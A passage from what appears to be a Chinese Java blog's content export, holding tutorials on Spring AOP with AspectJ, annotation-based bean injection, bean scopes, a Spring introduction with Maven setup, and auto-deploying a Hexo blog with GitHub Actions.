那么为了解决为了解决这个问题，AOP的思想随之产生。它采取了横向抽取机制。将分散在各个方法中的重复代码提取出来，然后在程序编译或运行时，再将这些提取出来的代码应用到需要执行的地方。这种采用横向提取机制的方式。是采用传统的AOP方式下无法办到的。因为传统的面向对象思想只能实现父子关系的纵向重用。 在AOP思想中，通过aspect(切面)可以分别在不同的类的方法中加入，例如事务日志权限和异常处理等功能。 使用切面这种横向方式。能够使开发人员在编写业务逻辑时专注于核心业务逻辑，而不用过度的关注与其他业务逻辑的实现。这样可以提高开发效率，同时还增强了代码的可维护性。 目前主流的AOP 框架有2个，分别是spring aop 和aspectJ，前者是纯Java 实现的，不需要专门的编译过程和类加载器，在运行期间可以通过代理的方式向目标内植入增强的代码。而AspectJ是一个基于Java语言的AOP框架。在Spring 2.0 开始，引入了对AspectJ 的支持，并提供了一个专门的编译器在编译时提供横向代码的植入。 相关术语在了解AOP之前，首先要了解一下它的专业术语。这些术语包括Aspect、Joinpiont、Pointcut、Advice、Target Object、Proxy 和Weaving，对于这些专业术语具体的解释如下： Aspect，切面在实际的应用中，切面通常是指封装的用于横向插入系统功能，比如事务日志的类，该类被spring容器识别为切面，需要在配置文件中通过&lt;bean&gt;来指定。 Joinpiont，连接点，在程序执行过程中的某个阶段点。它实际上是对象的一个操作，例如方法的调用或异常的抛出。在spring AOP中连接点就是指方法的调用。 Pointcut，切入点，切入点是指切面与程序流程的交叉点，即那些需要处理的连接点，通常在程序中切入点是指。类或者是方法名，比如说某个通知要应用到所有的以add开头的方法中。那么所有满足这一规则的方法都是切入点。 Adivce，通知增强处理，AOP 框架在特定的切入点执行增强处理，即在定义好的切入点处理所需要执行的程序代码，你可以理解其为切面类中的方法，它是切面的具体实现。 Target Object ，目标对象，是指所有通知的对象。也称为北增强对象。如果AOP框架采用的是动态的AOP实现，那么该对象就是一个被代理对象。 Proxy ，代理，将通知应用到目标对象之后被动态创建的对象。 Weaving， 织入，将切面代码插入目标对象上，从而生成代理对象的过程。 AspectJ 开发使用AspectJ 实现AOP 的方式有 XML 声明 注解 XML 声明 这种方式是通过XML文件来定义切面、切入点以及通知等，所有的切面、切入点和通知都必须定义在&lt;aop:config&gt; 元素中，在&lt;beans&gt;元素中可以包含多个&lt;aop:config&gt; 元素，一个&lt;aop:config&gt; 中又可以包含子元素和属性，其子元素包含&lt;aop:pointcut、&lt;aop:advisor、&lt;aop:aspect&gt;，在配置时，需要严格按照顺序来定义，在&lt;aop:aspect&gt; 下，同样包含属性和多个子元素，通过使用&lt;aop:aspect&gt;元素以及其子元素 可以在XML中配置切面、切入点和通知。如下所示 1234567891011121314151617181920212223242526272829303132&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:aop&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&#x2F;spring-aop-4.3.xsd&quot;&gt; &lt;!-- 1 目标类 --&gt; &lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;com.ssm.aspectj.UserDaoImpl&quot; &#x2F;&gt; &lt;!-- 2 切面 --&gt; &lt;bean id&#x3D;&quot;myAspect&quot; class&#x3D;&quot;com.ssm.aspectj.xml.MyAspect&quot; &#x2F;&gt; &lt;!-- 3 aop编程 --&gt; &lt;aop:config&gt; &lt;!-- 1.配置切面 --&gt; &lt;aop:aspect id&#x3D;&quot;aspect&quot; ref&#x3D;&quot;myAspect&quot;&gt; &lt;!-- 2.配置切入点 --&gt; &lt;aop:pointcut expression&#x3D;&quot;execution(* com.ssm.aspectj.*.*(..))&quot; id&#x3D;&quot;myPointCut&quot; &#x2F;&gt; &lt;!-- 3.配置通知 --&gt; &lt;!-- 前置通知 --&gt; &lt;aop:before method&#x3D;&quot;myBefore&quot; pointcut-ref&#x3D;&quot;myPointCut&quot; &#x2F;&gt; &lt;!--后置通知--&gt; &lt;aop:after-returning method&#x3D;&quot;myAfterReturning&quot; pointcut-ref&#x3D;&quot;myPointCut&quot; returning&#x3D;&quot;returnVal&quot;&#x2F;&gt; &lt;!--环绕通知 --&gt; &lt;aop:around method&#x3D;&quot;myAround&quot; pointcut-ref&#x3D;&quot;myPointCut&quot; &#x2F;&gt; &lt;!--异常通知 --&gt; &lt;aop:after-throwing method&#x3D;&quot;myAfterThrowing&quot; pointcut-ref&#x3D;&quot;myPointCut&quot; throwing&#x3D;&quot;e&quot; &#x2F;&gt; &lt;!--最终通知 --&gt; &lt;aop:after method&#x3D;&quot;myAfter&quot; pointcut-ref&#x3D;&quot;myPointCut&quot; &#x2F;&gt; &lt;&#x2F;aop:aspect&gt; &lt;&#x2F;aop:config&gt;&lt;&#x2F;beans&gt; 但是 XML 的配置过于复杂，因为日常开发过程中，我们更倾向于使用注解的方式来进行AOP的开发 为了在应用中使用@AspectJ支持，Spring需要添加三个库： aspectjweaver.jar aspectjrt.jar aopalliance.jar 因此，我们需要配置maven，如下所示 12345678910&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjrt&lt;&#x2F;artifactId&gt; &lt;version&gt;1.6.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;&#x2F;artifactId&gt; &lt;version&gt;1.6.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; 新建一个app.xml ，我们需要在Spring配置文件中做如下配置： 12345678910111213141516&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:aop&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&#x2F;spring-aop-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context-4.3.xsd&quot;&gt; &lt;!-- 指定需要扫描的包，使注解生效 --&gt; &lt;context:component-scan base-package&#x3D;&quot;com.ssm.aspectj&quot; &#x2F;&gt; &lt;!-- 启动基于注解的声明式AspectJ支持 --&gt; &lt;aop:aspectj-autoproxy &#x2F;&gt;&lt;&#x2F;beans&gt; 然后，我们创建一个UserDao 的接口，如下所示 123456789package com.ssm.aspectj;public interface UserDao &#123; &#x2F;&#x2F; add user public void addUser(); &#x2F;&#x2F;delete user public void delUser();&#125; 将 UserDao 实例化，并加上注解@Repository(“userDao”)，方便后续进行调用具体的方法 1234567891011121314151617package com.ssm.aspectj;import org.springframework.stereotype.Repository;@Repository(&quot;userDao&quot;)public class UserDaoImpl implements UserDao&#123; @Override public void addUser() &#123; System.out.println(&quot;add user&quot;); &#125; @Override public void delUser() &#123; System.out.println(&quot;delete user&quot;); &#125;&#125; 定义一个切面类，在该类中编写各种通知 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.ssm.aspectj.xml;import org.aspectj.lang.JoinPoint;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.After;import org.aspectj.lang.annotation.AfterReturning;import org.aspectj.lang.annotation.AfterThrowing;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;import org.aspectj.lang.annotation.Pointcut;import org.springframework.stereotype.Component;&#x2F;** * 切面类，在此类中编写通知 *&#x2F;@Aspect@Componentpublic class MyAspect &#123; &#x2F;&#x2F;定义切入点表达式 @Pointcut(&quot;execution(* com.ssm.aspectj.*.*(..))&quot;) &#x2F;&#x2F;使用一个返回值为void、方法体为空的方法来命名切入点 private void myPointCut()&#123;&#125; &#x2F;&#x2F;前置通知 @Before(&quot;myPointCut()&quot;) public void myBefore(JoinPoint joinPoint)&#123; System.out.print(&quot;前置通知：模拟执行权限检查..，&quot;); System.out.print(&quot;目标类是：&quot;+joinPoint.getTarget()); System.out.println(&quot;，被植入增强处理的目标方法为：&quot;+joinPoint.getSignature().getName()); &#125; &#x2F;&#x2F;后置通知 @AfterReturning(value&#x3D;&quot;myPointCut()&quot;) public void myAfterReturning(JoinPoint joinPoint) &#123; System.out.print(&quot;后置通知：模拟记录日志..，&quot;); System.out.println(&quot;被植入增强处理的目标方法为：&quot; + joinPoint.getSignature().getName()); &#125; &#x2F;** * 环绕通知 * ProceedingJoinPoint是JoinPoint的子接口，表示可执行目标方法 * 1.必须是Object类型的返回值 * 2.必须接收一个参数，类型为ProceedingJoinPoint * 3.必须throws Throwable *&#x2F; @Around(&quot;myPointCut()&quot;) public Object myAround(ProceedingJoinPoint proceedingJoinPoint) throws Throwable&#123; &#x2F;&#x2F;开始 System.out.println(&quot;环绕开始：执行目标方法之前，模拟开启事务..，&quot;); &#x2F;&#x2F;执行当前目标方法 Object obj&#x3D;proceedingJoinPoint.proceed(); &#x2F;&#x2F;结束 System.out.println(&quot;环绕结束：执行目标方法之后，模拟关闭事务..，&quot;); return obj; &#125; &#x2F;&#x2F;异常通知 @AfterThrowing(value&#x3D;&quot;myPointCut()&quot;,throwing&#x3D;&quot;e&quot;) public void myAfterThrowing(JoinPoint joinPoint,Throwable e)&#123; System.out.println(&quot;异常通知：出错了&quot;+e.getMessage()); &#125; &#x2F;&#x2F;最终通知 @After(&quot;myPointCut()&quot;) public void myAfter()&#123; System.out.println(&quot;最终通知：模拟方法结束后释放资源..&quot;); &#125;&#125; srping 的通知包括五种通知工作： 通知 描述 前置通知 在一个方法执行之前，执行通知。 后置通知 在一个方法执行之后，不考虑其结果，执行通知。 返回后通知 在一个方法执行之后，只有在方法成功完成时，才能执行通知。 抛出异常后通知 在一个方法执行之后，只有在方法退出抛出异常时，才能执行通知。 环绕通知 在建议方法调用之前和之后，执行通知。 在上述代码中，其中 @Pointcut(“execution(* com.ssm.aspectj..(..))”) 表示定义切入点，使用注解@Pointcut 后面的execution(* com.ssm.aspectj..(..)) 表示匹配所有目标类的所有方法。 第一个代表返回类型，第二个代表方法名，而..代表任意入参的方法，他的格式如下 语法：execution(修饰符 返回值 包.类.方法(参数) throws 异常) 最后编写个测试类从ClassPathXmlApplicationContext 读取xml 文件，然后调用getBean 获取userDao并执行addUser方法。 12345678910111213141516package com.ssm.aspectj;import org.junit.jupiter.api.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class TestXmlAspectJ &#123; @Test public void testAnnotation() &#123; ApplicationContext applicationContext&#x3D;new ClassPathXmlApplicationContext(&quot;app.xml&quot;); &#x2F;&#x2F;从容器中获得内容 UserDao userDao&#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); &#x2F;&#x2F;执行方法 userDao.addUser(); &#125;&#125; 结果如下","categories":[{"name":"Spring","slug":"Spring","permalink":"https://awen.me/categories/Spring/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://awen.me/tags/Spring/"}]},{"title":"Spring 自动注解","slug":"Spring 自动注解","date":"2020-03-27T09:45:13.000Z","updated":"2021-02-26T06:05:29.265Z","comments":true,"path":"posts/b38fa135.html","link":"","permalink":"https://awen.me/posts/b38fa135.html","excerpt":"","text":"在Spring 中除了可以通过XML 来进行装备，还可以使用注解，Spring 提供了对annotation (注解)的全面支持 常用的注解有 声明bean的注解 @Component 组件，没有明确的角色 @Service 在业务逻辑层使用（service层） @Repository 在数据访问层使用（dao层） @Controller 在展现层使用，控制器的声明（C） 注入bean的注解 @Autowired：由Spring提供 @Inject：由JSR-330提供 @Resource：由JSR-250提供 案例首先，创建一个userDao 12345package com.springdemo;public interface UserDao &#123; public void save();&#125; 然后创建userDao 的实现类UserDaoImpl 123456789101112package com.springdemo;import com.springdemo.UserDao;import org.springframework.stereotype.Repository;@Repository(&quot;userDao&quot;)public class UserDaoImpl implements UserDao &#123; @Override public void save() &#123; System.out.println(&quot;userDao.save&quot;); &#125;&#125; 创建userService 12345package com.springdemo;public interface UserService &#123; public void save();&#125; 创建userService 的实现类UserServiceImpl 12345678910111213141516package com.springdemo;import org.springframework.stereotype.Service;import javax.annotation.Resource;@Service(&quot;userService&quot;)public class UserServiceImpl implements UserService &#123; @Resource(name &#x3D; &quot;userDao&quot;) private UserDao userDao; @Override public void save() &#123; this.userDao.save(); System.out.println(&quot;userService.save()&quot;); &#125;&#125; 创建UserController 123456789101112131415package com.springdemo;import javax.annotation.Resource;import org.springframework.stereotype.Controller;@Controller(&quot;UserController&quot;)public class UserController &#123; @Resource(name&#x3D;&quot;userService&quot;) private UserService userService; public void save()&#123; this.userService.save(); System.out.println(&quot;运行userController.save()&quot;); &#125;&#125; Resource 如果报错，需要在pom.xml 中添加javax.annotation 12345&lt;dependency&gt; &lt;groupId&gt;javax.annotation&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jsr250-api&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 创建一个beans.xml 123456789101112131415161718192021&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context-4.3.xsd&quot;&gt; &lt;!-- xmlns 即 xml namespace xml 使用的命名空间 xmlns:xsi 即 xml schema instance xml 遵守的具体规范 xsi:schemaLocation 本文档 xml 遵守的规范 官方指定 --&gt; &lt;--使用context命名空间在配置文件中开启相应的注解处理器--&gt; &lt;context:annotation-config &#x2F;&gt; &lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;com.springdemo.UserDaoImpl&quot;&#x2F;&gt; &lt;bean id&#x3D;&quot;userService&quot; class&#x3D;&quot;com.springdemo.UserServiceImpl&quot;&#x2F;&gt; &lt;bean id&#x3D;&quot;userController&quot; class&#x3D;&quot;com.springdemo.UserController&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; 如果context 报错，确认beans 中的xmlns和xsi 信息是否正确 创建AnnotationAssembleTest 12345678910111213package com.springdemo;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class AnnotationAssembleTest &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); UserController userController &#x3D; (UserController) applicationContext.getBean(&quot;userController&quot;); userController.save(); &#125;&#125; 执行结果 123userDao.saveuserService.save()运行userController.save()","categories":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/categories/GitHub/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/tags/GitHub/"}]},{"title":"Spring Bean 的作用域","slug":"Spring Bean 的作用域","date":"2020-03-27T08:45:13.000Z","updated":"2021-02-26T06:05:29.265Z","comments":true,"path":"posts/b38fa134.html","link":"","permalink":"https://awen.me/posts/b38fa134.html","excerpt":"","text":"Spring Bean 的作用域spring bean 的作用域有如下几种： singleton 在Spring 中仅存在一个Bean 实例，默认不配置就是这种方式。 prototype 每次都会创建一个新的实例 reques 每次HTTP请求会创建一个新的Bean，仅限webApplicationContext session 同一个 HTTP Session 共享一个Bean，不同的Session 使用不同的Bean，仅限webApplicationContext globalSession，通常用于Portlet 应用环境，限于 webApplicationContext 以上五种作用域中，request、session和global session三种作用域仅在基于web的应用中使用（不必关心你所采用的是什么web应用框架），只能用在基于web的Spring ApplicationContext环境。 下面简单介绍下2种 singleton当一个bean的作用域为Singleton，那么Spring IoC容器中只会存在一个共享的bean实例，并且所有对bean的请求，只要id与该bean定义相匹配，则只会返回bean的同一实例。 applicationContext.xml 12345678910111213&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beanshttp:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd&quot;&gt; &lt;!-- xmlns 即 xml namespace xml 使用的命名空间 xmlns:xsi 即 xml schema instance xml 遵守的具体规范 xsi:schemaLocation 本文档 xml 遵守的规范 官方指定 --&gt; &lt;!--bean 默认的scope 是singleton--&gt; &lt;bean id&#x3D;&quot;scope&quot; class&#x3D;&quot;com.springdemo.Scope&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; ScopeTest.java 12345678910111213141516171819202122package com.springdemo;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class ScopeTest &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); &#x2F;** * 两次输出结果一致，因为默认的作用域是 singleton，singleton 定义的bean 在spring 容器中将只有一个实例，无论有多少个bean引用都始终指向同一个对象 * * com.springdemo.Scope@75c072cb * com.springdemo.Scope@75c072cb *&#x2F; System.out.println(applicationContext.getBean(&quot;scope&quot;)); System.out.println(applicationContext.getBean(&quot;scope&quot;)); &#125;&#125; prototype使用scope 指定作用域为 prototype 1&lt;bean id&#x3D;&quot;scope&quot; class&#x3D;&quot;com.springdemo.Scope&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt; 当一个bean的作用域为Prototype，表示一个bean定义对应多个对象实例。Prototype作用域的bean会导致在每次对该bean请求（将其注入到另一个bean中，或者以程序的方式调用容器的getBean()方法）时都会创建一个新的bean实例。Prototype是原型类型，它在我们创建容器的时候并没有实例化，而是当我们获取bean的时候才会去创建一个对象，而且我们每次获取到的对象都不是同一个对象。 代码 12345678910111213141516171819202122package com.springdemo;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class ScopeTest &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); &#x2F;** * 对于需要保持会话状态的Bean，应用使用prototype 作用域，spring会为每个请求都创建一个新实例 * * com.springdemo.Scope@341b80b2 * com.springdemo.Scope@55a1c291 *&#x2F; System.out.println(applicationContext.getBean(&quot;scope&quot;)); System.out.println(applicationContext.getBean(&quot;scope&quot;)); &#125;&#125;","categories":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/categories/GitHub/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/tags/GitHub/"}]},{"title":"使用 Github Actions自动部署Hexo","slug":"Github-Actions自动部署Hexo","date":"2020-03-27T05:42:13.000Z","updated":"2021-02-26T06:05:29.247Z","comments":true,"path":"posts/b38fa124.html","link":"","permalink":"https://awen.me/posts/b38fa124.html","excerpt":"","text":"话说每次写文章都需要执行 hexo g -d，如果换个机器想记录点东西还得备一套nodejs 环境，着实麻烦，最近发现Github Actions 非常好用，只需要写完文章，将markdown文件丢到GitHub 去就可以自动触发编译，整个过程非常的快，下面将介绍如何去使用 准备2个仓库首先需要准备2个仓库， 一个是你博客托管在GitHub的公共仓库用来提供博客的访问服务 一个是私有仓库用来上传hexo源码 比如我的公共仓库就是 awen.github.io 而私有仓库你自己取名字，我这里叫 deploy_blog，然后把本地的hexo 环境中的文件全部上传到私有仓库去 创建私钥1ssh-keygen -t rsa -b 4096 -f ~&#x2F;.ssh&#x2F;github-actions-deploy 在Settings-&gt;SSH and GPG keys添加刚刚生成的公钥，名称随意。 在私有仓库的Settings-&gt;Secrets里添加刚刚生成的私钥，名称为 ACTION_DEPLOY_KEY。 配置hexo 的 config.yml在hexo 的站点配置文件下的deploy 中配置repo 为你博客公共仓库的git地址 1234deploy: - type: git repo: git@github.com:monkey-wenjun&#x2F;awen.github.io.git branch: master 配置 workflows在私有仓库的Actions选项卡下点击新建workflow，编写如下配置。 1234567891011121314151617181920212223242526272829303132333435363738name: Deploy Blogon: [push] # 当有新push时运行jobs: build: # 一项叫做build的任务 runs-on: ubuntu-latest # 在最新版的Ubuntu系统下运行 steps: - name: Checkout # 将仓库内master分支的内容下载到工作目录 uses: actions&#x2F;checkout@v1 # 脚本来自 https:&#x2F;&#x2F;github.com&#x2F;actions&#x2F;checkout - name: Use Node.js 12.x # 配置Node环境 uses: actions&#x2F;setup-node@v1 # 配置脚本来自 https:&#x2F;&#x2F;github.com&#x2F;actions&#x2F;setup-node with: node-version: &quot;12.x&quot; - name: Setup Hexo env env: ACTION_DEPLOY_KEY: $&#123;&#123; secrets.ACTION_DEPLOY_KEY &#125;&#125; run: | # set up private key for deploy mkdir -p ~&#x2F;.ssh&#x2F; echo &quot;$ACTION_DEPLOY_KEY&quot; | tr -d &#39;\\r&#39; &gt; ~&#x2F;.ssh&#x2F;id_rsa # 配置秘钥 chmod 600 ~&#x2F;.ssh&#x2F;id_rsa ssh-keyscan github.com &gt;&gt; ~&#x2F;.ssh&#x2F;known_hosts # set git infomation git config --global user.name &#39;monkey-wenjun&#39; # 换成你自己名字 git config --global user.email &#39;xxxxx&#39; # 换成你的邮箱 # install dependencies npm i -g hexo-cli # 安装hexo npm i - name: Deploy run: | # publish hexo generate &amp;&amp; hexo deploy # 执行部署程序 你也可以在本地的.github 目录下新建一个workflows 目录，在里面新建一个yml 文件内容如上，然后将文件push 到github 上去就会自动触发编译了。 编译过程中如果有错误，在GitHub的actions 中可以看到一个叉，发布成功的是一个绿色的勾 发布失败的可以点进去看下是哪一个步骤出错了，然后对应的修改即可，比如我这里是deploy 这步错了 点击展开，可以看到，根据报错调整你的workflows 文件即可","categories":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/categories/GitHub/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/tags/GitHub/"}]},{"title":"Spring 如何入门","slug":"Spring-如何入门","date":"2020-03-27T01:20:19.000Z","updated":"2021-02-26T06:05:29.265Z","comments":true,"path":"posts/f63ef5c2.html","link":"","permalink":"https://awen.me/posts/f63ef5c2.html","excerpt":"","text":"Spring 入门现在很多企业级的项目都是基于 spring 框架开发的，而这两年很火的微服务概念就有基于 springboot springcloud 等框架，spring 框架解决企业应用的复杂性和耦合性，对于一个Java 程序员来说，要想学习 springboot 和 springcloud，掌握 spring 的基础用法是一件必须做的事情。那么本文就带领大家一起来理解下 spring 的基本概念以及通过一些案例来快速配置 spring，从而理解 spring 的 IoC 和 DI 概念。 学习 Springboot 和 Springcloud 要不要跳过 spring？我的建议是不要，应该先学习 spring 和 spring mvc，然后进阶去学习 Spring其他框架，会更便于你理解。 什么是 springSpring 是一个以 IoC （英文 Inversion of Control,控制反转)和 AOP(Aspect Oriented Programming)为内核的框架，那么啥是 IoC？AOP 又是个什么鬼？ 什么是 IoC IoC 是 spring 的基础，通过 IoC 可以实现控制，在学 Java 基础的时候我们知道调用 new 关键词来构造一个方法创建对象，而在 Spring 中创建对象就是用 IoC。spring 中的 IoC 方式对象的生命周期管理由Spring 框架提供的 IoC 容器来管理，我们可以直接从 IoC 容器中获取对象，控制权从应用程序交给了 IoC 容器。 什么是 DI 而 DI（Dependency Inject，依赖注入)与 IoC 其实含义是一样的，DI 就是对象的属性，已经被注入好相关的 value，直接使用即可。所谓的依赖注入就是由IoC 容器在运行期间动态的将某种依赖关系注入到对象之中。 什么是 AOP 而AOP 是面向切面编程，它是通过预编译方式和运行期间动态代理实现程序功能的统一维护的一种技术，AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。 我相信你对于上面的话每一个字你都能看懂，但是连在一起你就不知道是什么意思了，没关系，我们继续往下看。 在我们学习 Java 面向对象的时候，我们都知道，如果你写的代码出现重复了可以将重复的代码做如下操作： 抽取成方法 抽取类 抽取成类的方式我们称之为纵向抽取，我们可以通过继承的方式实现纵向抽取。但是在负载的业务场景下即使抽取成类还是会出现重复的代码，因为一些逻辑(开始、结束、提交事务)依附在我们业务类的方法逻辑中！ 而AOP的理念则是将分散在各个业务逻辑代码中相同的代码通过横向切割的方式抽取到一个独立的模块中！ 使用 Ioc/DI 的优势是啥 可维护性好，方便进行单元测试和故障诊断，因为代码中的每一个 class 都可以单独测试，彼此之间没有联系，组件之间低耦合或者无耦合。 每个开发团队不需要关心别人写的业务逻辑，便于分工协助。 可复用性好，我们可以把具有普遍意义的组件独立出来反复使用到其他部门或其他项目中，其实这也是面向对象的思想。 生成对象的方式转为外置方式，在 Spring 中，我们把生成的对象直接写在配置文件中去定义使用，当我们需要更换一个实现类时，只需要修改配置文件即可，具有热插拔的特点。 入门 springspring 框架不断的升级，目前最新版本已经更新到了 5.2.5 了。但是在本文中我们使用的是4.3.6 来讲解，为了更好的创建一个 spring 项目我们使用的工具有下面： maven idea 社区版 同时由于 spring 的 jar 包 都在国外服务器，下载速度慢，所以我们使用阿里云的仓库进行加速 打开maven的配置文件(windows机器一般在maven安装目录的conf/settings.xml)，在标签中添加mirror子节点插入如下代码就可以使用阿里云的镜像加速下载 jar 包了: 123456&lt;mirror&gt; &lt;id&gt;aliyunmaven&lt;&#x2F;id&gt; &lt;mirrorOf&gt;*&lt;&#x2F;mirrorOf&gt; &lt;name&gt;阿里云公共仓库&lt;&#x2F;name&gt; &lt;url&gt;https:&#x2F;&#x2F;maven.aliyun.com&#x2F;repository&#x2F;public&lt;&#x2F;url&gt;&lt;&#x2F;mirror&gt; 使用 idea 创建一个 maven 项目 并在 pom.xml 的dependencies中添加如下内容 123456789101112131415161718192021222324252627&lt;dependency&gt; &lt;groupId&gt;junit&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt; &lt;version&gt;4.11&lt;&#x2F;version&gt; &lt;scope&gt;test&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-beans&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-beans&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-context&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-core&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; 其中 spring-core 包含了 spring 框架基本的核心工具类，spring 其他组件，比如 spingboot、springcloud 都要用到它。 spring-beans 所以应用都要用到的 jar 包，它包含了访问配置文件、创建和管理 bean 以及进行 Ioc和 DI 操作的相关类。 spring-context 提供了基础的 IoC 功能上的扩展服务。还提供了远程访问、缓存、邮件服务等各种试图层框架的封装。 spring 的核心容器 spring 框架提供了两个最基本最重要的包 org.springframework.beans.factory和org.springframework.context。前者的主要接口是 BeanFactory，后者的主要接口是 ApplicationFactory。 IoC 框架的主要组件有 Beans、配置文件 applicationcontext.xml、Beanfactory 接口和相关类、ApplicationContext 接口和相关类。 Beans 是项目中为业务提供功能的 Bean，就是容器要管理的 Bean，也就是我们场景的 JavaBean、Java 类。 在 Spring 中 Bean 的管理是基于配置文件配置的，如下所示: 123456789101112131415&lt;?xml version&#x3D;&quot;1.0&quot; 